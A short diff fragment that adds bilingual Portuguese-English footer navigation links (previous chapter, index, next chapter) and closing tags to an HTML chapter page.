+<a href="cap03.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap05.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
